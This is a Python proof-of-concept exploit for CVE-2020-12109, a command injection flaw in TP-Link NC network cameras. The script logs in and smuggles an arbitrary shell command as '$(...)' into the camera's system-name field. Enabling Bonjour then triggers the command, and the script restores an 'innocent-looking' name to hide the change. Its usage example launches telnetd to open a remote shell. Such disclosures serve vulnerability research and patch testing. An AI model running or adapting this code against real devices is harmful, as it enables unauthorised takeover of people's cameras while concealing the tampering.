#!/usr/bin/env python3

import requests as r
import hashlib
import base64
import json
import sys

def login(url, user, password, hashPassword):
    password = base64.b64encode(bytes(password, encoding='utf8'))

    if hashPassword:
        h = hashlib.new('md5')
        h.update(password)
        password = h.hexdigest()
    else:
        password = password.decode("utf-8")

    ret = r.request('POST', '%s/login.fcgi' % url, verify=False,
        headers = { 'Content-Type' : 'application/x-www-form-urlencoded',
                    'Content-Length' : '%s' % len("Username=%s&Password=%s") } ,
        data="Username=%s&Password=%s" % (user, password))

    response = json.loads(ret.text)

    if "token" in response:
        token = response["token"]
        cookie = ret.cookies['sess']
        return token, cookie

    return None, None

def setSysName(url, sysname, cookie, token):
    ret = r.request('POST', '%s/setsysname.fcgi' % url, verify=False,
        headers = { 'Content-Type' : 'application/x-www-form-urlencoded',
                    'Cookie' : 'sess=%s' %cookie ,
                    'Content-Length' : '%s' % len("sysname=%s&token=%s" % (sysname, token)) } ,
        data="sysname=%s&token=%s" % (sysname, token) )

    return ret.text

def enableBonjour(url, cookie, token):
    ret = r.request('POST', '%s/setbonjoursetting.fcgi' % url, verify=False,
        headers = { 'Content-Type' : 'application/x-www-form-urlencoded',
                    'Cookie' : 'sess=%s' % cookie ,
                    'Content-Length' : '%s' % len("bonjourState=1&token=%s" % token) } ,
        data="bonjourState=1&token=%s" % token )

    return ret.text

def is_NC260_or_NC450(url):
    ret = r.request('GET', '%s' % url, verify = False)

    if "NC260" in ret.text or "NC450" in ret.text:
        return True

    return False

def checkSuccess(ret):
    if '{"errorCode":0}' not in ret:
        print("[-] Target returned error. Exiting...")
        quit()

r.urllib3.disable_warnings()

print("TP-LINK NC Cameras Bonjour Command Injection PoC [CVE-2020-12109]")
print("Pietro Oliva - <pietroliva|a|t|gmail.com>\n")

if len(sys.argv) < 5:
    print("usage: %s <camera_url> <user> <pass> <command>" % sys.argv[0])
    print("e.g.:  %s http://192.168.0.1 admin admin telnetd" % sys.argv[0])
    quit()

url      = "%s//%s" % (sys.argv[1].split('/')[0], sys.argv[1].split('/')[2])
user     = sys.argv[2]
password = sys.argv[3]
sysname  = "$(%s)" % sys.argv[4]

hashPassword = is_NC260_or_NC450(url)
token, cookie = login(url, user, password, hashPassword)
if token == None:
    print("Login failed!")
    quit()
print("[+] Auth successful!")

print("[*] Setting system name...")
ret = setSysName(url, sysname, cookie, token)
checkSuccess(ret)
print("[+] Sysname has been set successfully")

print("[*] Enabling bonjour...")
ret = enableBonjour(url, cookie, token)
checkSuccess(ret)
print("[+] Bonjour has been enabled successfully")

print("[*] Setting back an innocent-looking camera name...")
ret = setSysName(url, "NC200", cookie, token)
checkSuccess(ret)

print("[+] Done")
